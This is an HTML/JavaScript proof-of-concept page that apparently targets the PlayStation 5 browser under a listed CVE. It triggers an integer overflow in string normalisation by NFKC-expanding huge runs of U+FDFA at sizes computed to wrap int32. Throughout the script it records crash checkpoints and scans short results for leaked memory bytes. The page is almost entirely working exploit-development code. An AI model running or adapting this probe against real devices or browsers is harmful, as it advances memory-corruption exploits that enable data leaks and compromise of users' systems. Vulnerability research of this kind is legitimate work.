<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CVE-2025-46299 — Binary Search Overflow</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

// Better checkpoint — includes test info
function cp(msg) {
    try {
        localStorage.setItem('norm_cp', msg);
    } catch(e) {}
}

window.addEventListener('load', () => {
    const last = localStorage.getItem('norm_cp');
    if (last) {
        L('[!] PREVIOUS CRASH DETECTED!');
        L('[!] Last checkpoint: ' + last);
        L('');
    }
    run();
});

async function run() {
    L('[*] Binary search for exact overflow point\n');
    
    // int32_t max = 2,147,483,647
    // \uFDFA expands 18x in NFKC
    // Overflow at: 2,147,483,648 / 18 = 119,304,647.1
    // 
    // At N=238,609,295: 18*N = 4,294,967,310 → wraps to 14 (int32)
    // At N=238,609,296: 18*N = 4,294,967,328 → wraps to 32
    //
    // We need to find:
    // 1. Does the crash happen at the negative overflow (119.3M)?
    // 2. Or at the wrap-to-positive (238.6M)?
    // 3. Is there a size where it DOESN'T crash but returns short?
    
    const tests = [
        // Safe sizes (no overflow)
        { n: 50000000,  desc: '50M (safe, exp=900M)' },
        { n: 100000000, desc: '100M (safe, exp=1.8B)' },
        { n: 119000000, desc: '119M (safe, exp=2.142B)' },
        
        // Just before overflow
        { n: 119304647, desc: '119.3M (at limit, exp=2,147,483,646)' },
        
        // Just after overflow — negative values
        { n: 119304648, desc: '119.3M+1 (overflow! exp=2,147,483,664 → int32=-2,147,483,632)' },
        { n: 119400000, desc: '119.4M (exp=2.149B → int32=-2,145,696,000)' },
        { n: 120000000, desc: '120M (exp=2.16B → int32=-2,134,967,296)' },
        
        // Mid-range overflow — still negative
        { n: 150000000, desc: '150M (exp=2.7B → int32=-1,594,967,296)' },
        { n: 200000000, desc: '200M (exp=3.6B → int32=-694,967,296)' },
        
        // Near the wrap point — should become small positive
        { n: 238000000, desc: '238M (exp=4.284B → int32=5,033,216)' },
        { n: 238609294, desc: '238.6M-1 (exp=4,294,967,292 → int32=-4)' },
        { n: 238609295, desc: '238.6M (exp=4,294,967,310 → int32=14!)' },
        { n: 238609296, desc: '238.6M+1 (exp=4,294,967,328 → int32=32)' },
        { n: 238700000, desc: '238.7M (exp=4,296,600,000 → int32=1,632,704)' },
    ];
    
    for (const t of tests) {
        const exp = t.n * 18;
        const asInt32 = exp > 2147483647 ? (exp > 4294967295 ? exp - 4294967296 : exp - 4294967296) : exp;
        const asUnsigned = asInt32 < 0 ? asInt32 + 4294967296 : asInt32;
        
        L('=== ' + t.desc + ' ===');
        L('  N=' + t.n + ' exp=' + exp + ' int32=' + asInt32 + ' uint=' + asUnsigned);
        
        cp('TEST:' + t.desc + '|N=' + t.n + '|CREATE');
        
        try {
            L('  [*] Creating string (' + Math.round(t.n * 2 / 1024 / 1024) + 'MB)...');
            let s = '\uFDFA'.repeat(t.n);
            L('  [+] String created. len=' + s.length);
            
            cp('TEST:' + t.desc + '|N=' + t.n + '|NORMALIZE:NFKC');
            L('  [*] Calling normalize("NFKC")...');
            
            let r = s.normalize('NFKC');
            
            cp('TEST:' + t.desc + '|N=' + t.n + '|DONE:len=' + r.length);
            L('  [+] normalize() returned! len=' + r.length);
            
            if (r.length < 1000 && r.length !== exp) {
                L('  [!] SHORT RESULT! Got ' + r.length + ' expected ' + exp);
                L('  [!] INTEGER OVERFLOW CONFIRMED!');
                
                // Dump content
                let hex = [];
                for (let i = 0; i < Math.min(r.length, 64); i++) {
                    hex.push(r.charCodeAt(i).toString(16).padStart(4, '0'));
                }
                L('  [!] Content hex: ' + hex.join(' '));
                L('  [!] If not all Arabic → LEAKED DATA!');
                
                // Check for non-Arabic chars
                let anomalies = 0;
                for (let i = 0; i < r.length; i++) {
                    let c = r.charCodeAt(i);
                    if (c < 0x0600 || c > 0x06FF) {
                        if (c !== 0x0020) anomalies++;
                    }
                }
                if (anomalies > 0) {
                    L('  [!] ' + anomalies + ' non-Arabic chars → POSSIBLE LEAK!');
                }
            } else if (r.length === exp) {
                L('  [*] Length matches — no overflow');
            } else {
                L('  [?] Unexpected length: ' + r.length);
            }
            
            s = null;
            r = null;
            
        } catch (e) {
            L('  [!] ' + e.name + ': ' + e.message);
            cp('TEST:' + t.desc + '|ERROR:' + e.name);
        }
        
        L('');
        await new Promise(r => setTimeout(r, 200));
    }
    
    cp('ALL_DONE');
    L('[*] All tests finished. Check which test caused the crash.');
}
</script>
</body>
</html>
